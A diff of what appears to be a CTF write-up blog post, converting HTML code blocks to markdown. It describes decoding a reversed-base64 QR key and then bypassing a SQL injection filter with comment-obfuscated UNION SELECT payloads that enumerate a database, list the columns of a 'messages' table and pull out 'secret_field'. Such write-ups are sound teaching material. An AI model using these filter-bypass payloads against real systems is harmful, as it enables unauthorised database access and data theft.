@@ -47,8 +47,11 @@ Ok, it all worked as it supposed to. I used the [zxing][2] service to view the
 
 Look at the raw text. It&#8217;s a short string that looks like it was base64 encoded. But wait, base64 can&#8217;t begin with &#8220;==&#8221;! Those characters usually appear at the end of base64 encoded strings. Is it reversed? Let&#8217;s check:
 
-<pre class="lang:python decode:true ">&gt;&gt;&gt; "==QehRXS"[::-1].decode('base64')
-'Itay'</pre>
+```python
+&gt;&gt;&gt; "==QehRXS"[::-1].decode('base64')
+'Itay'
+```
+
 
 Yes! it indeed was reversed. our key (QR code) is created by: QR(Reverse(Base64(name))).
 
@@ -60,7 +63,10 @@ I began with the obvious: &#8216; or 1=1&#8211;
 
 Whoops, Busted. The system recognized my SQLi attack. I tried some filter bypassing methods and succeeded with this input:
 
-<pre class="lang:mysql decode:true">'/*..*/union/*..*/select/*..*/database()/*..*/union/*..*/select/*..*/'Megabeets</pre>
+```mysql
+'/*..*/union/*..*/select/*..*/database()/*..*/union/*..*/select/*..*/'Megabeets
+```
+
 
 <span style="font-size: 8pt;">Reverse(Base64(input)) == &#8220;==wc0VWZiF2Zl10JvoiLuoyL0NWZsV2cvoiLuoyLu9WauV3Lq4iLq8SKoU2chJWY0FGZvoiLuoyL0NWZsV2cvoiLuoyLu9WauV3Lq4iLq8yJ&#8221;</span>
 
@@ -70,13 +76,19 @@ It worked! now let&#8217;s find the correct table (&#8220;messages&#8221;) and c
 
 <span style="font-size: 8pt;">QR(Reverse(Base64(input))) == &#8220;zRXZlJWYnVWTn8iKu4iKvQ3YlxWZz9iKu4iKv42bp5WdvoiLuoyLnMXZnF2czVWbn8iKu4iKvU2apx2Lq4iLq8SZtFmbfVGbiFGdvoiLuoyLlJXZod3Lq4iLq8ycu1Wds92YuEWblh2Yz9lbvlGdh1mcvZmbp9iKu4iKv02byZ2Lq4iLq8SKl1WYu9lbtVHbvNGK0F2Yu92YfBXdvJ3ZvoiLuoyL0NWZsV2cvoiLuoyLu9WauV3Lq4iLq8yJ&#8221;</span>
 
-<pre class="lang:mysql decode:true">'/*..*/union/*..*/select/*..*/group_concat(column_name)/*..*/from/*..*/information_schema.columns/*..*/where/*..*/table_name/*..*/like/*..*/'messages'/*..*/union/*..*/select/*..*/'Megabeets</pre>
+```mysql
+'/*..*/union/*..*/select/*..*/group_concat(column_name)/*..*/from/*..*/information_schema.columns/*..*/where/*..*/table_name/*..*/like/*..*/'messages'/*..*/union/*..*/select/*..*/'Megabeets
+```
+
 
 <img src="../uploads/h4ck1t_russia_7-1024x679.png" /> 
 
 &#8220;secret_field&#8221;? Sounds suspicious. Let&#8217;s query it and see what it contains:
 
-<pre class="lang:mysql decode:true ">'/*..*/union/*..*/select/*..*/secret_field/*..*/from/*..*/messages/*..*/union/*..*/select/*..*/'Megabeets</pre>
+```mysql
+'/*..*/union/*..*/select/*..*/secret_field/*..*/from/*..*/messages/*..*/union/*..*/select/*..*/'Megabeets
+```
+
 
 <img src="../uploads/h4ck1t_russia_8-1024x744.png" /> 
 
